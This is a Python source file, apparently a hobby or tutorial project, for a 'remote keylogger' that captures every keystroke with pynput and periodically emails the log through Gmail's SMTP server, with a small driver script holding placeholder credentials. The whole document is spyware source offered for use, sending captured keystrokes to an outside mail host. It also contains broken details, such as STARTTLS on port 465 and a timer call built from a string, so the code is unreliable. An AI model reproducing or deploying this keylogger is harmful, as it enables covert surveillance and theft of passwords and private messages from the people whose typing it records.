

'''
https://pypi.org/project/pynput/
pynput library allows you to control and monitor input devices. Currently, mouse and keyboard input and monitoring are supported.

https://docs.python.org/2/library/threading.html
Threading is still an appropriate model if you want to run multiple I/O-bound tasks simultaneously.

https://docs.python.org/3/library/smtplib.html
The smtplib module defines an SMTP client session object that can be used to send mail to any Internet machine with an SMTP or ESMTP 
listener daemon. 

'''

'''
This keylogger programm records all key strikes that entered on the keyboard. This remote keylogger sends the reports of a user to a email.
'''

#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key =  str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
        #print(log)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, "\n\n" + self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 465)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()



'''
In order to use this class Keylogger, create an object that uses the blueprint or code to work.
Create a seperate python file and run this file. This file is actually to be the file that uses this object and runs keylogger.

'''

#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(180, "abc@gmail.com", "abc123456")
my_keylogger.start()






